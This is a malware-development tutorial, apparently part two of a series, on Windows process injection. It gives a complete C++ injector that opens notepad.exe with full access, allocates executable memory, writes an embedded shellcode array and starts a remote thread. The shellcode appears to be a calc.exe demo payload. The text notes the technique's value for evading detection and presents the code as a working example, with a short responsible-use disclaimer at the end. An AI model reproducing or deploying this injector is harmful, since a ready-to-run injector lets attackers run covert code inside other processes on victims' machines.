---
title: "Part 2: Process Injection Guide"
date: 2025-10-27
tags: ["maldev", "shellcode", "injection", "security-research"]
---

# Process Injection Guide

> **Educational Notes**: A structured guide to understanding process injection fundamentals

## Table of Contents

- [Overview](#overview)
- [What is Process Injection?](#what-is-process-injection)
- [Implementation Steps](#implementation-steps)
- [Code Examples](#code-examples)
- [Complete Implementation](#complete-implementation)

---

## Overview

Process injection is a technique used to execute code within the address space of another process. This is commonly used in malware development for educational and defensive security research purposes.

---

## What is Process Injection?

**Process injection** is a method of executing arbitrary code in the address space of a separate live process. This allows injected code to run under the security context of another process, potentially evading detection.

---

## Implementation Steps

Building a basic process injector requires several steps:

| Step | Action                     | Windows API              |
|------|----------------------------|--------------------------|
| **1** | Get Process ID             | `CreateToolhelp32Snapshot()` |
| **2** | Allocate remote memory     | `VirtualAllocEx()`       |
| **3** | Write shellcode to memory  | `WriteProcessMemory()`   |
| **4** | Create remote thread       | `CreateRemoteThread()`   |

### Detailed Process

1. **Get Process ID** – Use `tlhelp32.h` to enumerate processes and find the target
2. **Memory Allocation** – Use `VirtualAllocEx()` with `PAGE_EXECUTE_READWRITE` permissions
3. **Write Process** – Write the shellcode to the allocated memory
4. **Remote Thread** – Create a new thread in the remote process to execute the shellcode

---

## Code Examples

### Required Headers

```cpp
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
```

### Basic Implementation of GetProcessId

```cpp
DWORD GetProcessId(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}
```

### Main Implementation Pattern

```cpp
int main() {
    std::wstring targetProcessName = L"notepad.exe";
    DWORD processId = GetProcessId(targetProcessName);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteAddr, buf, sizeof(buf), NULL);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    CloseHandle(hProcess);
}
```

> **Tip**: Always validate process handles and check for NULL returns to handle failures gracefully

---

## Complete Implementation

The following demonstrates a **working example** that implements all the concepts above:

```cpp
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

unsigned char buf[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00
};

DWORD GetProcessId(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    std::wstring targetProcessName = L"notepad.exe";
    DWORD processId = GetProcessId(targetProcessName);

    if (processId == 0) {
        std::cout << "Process not found!" << std::endl;
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (hProcess == NULL) {
        std::cout << "Failed to open process!" << std::endl;
        return -1;
    }

    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (remoteAddr == NULL) {
        std::cout << "Failed to allocate memory!" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    WriteProcessMemory(hProcess, remoteAddr, buf, sizeof(buf), NULL);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);

    CloseHandle(hProcess);

    std::cout << "Injection successful!" << std::endl;
    return 0;
}
```

---

## Security Considerations

This technique is commonly used by malware but is also essential knowledge for:
- Security researchers
- Penetration testers
- Defensive security professionals
- Malware analysts

Always use this knowledge responsibly and only in authorized environments.

---
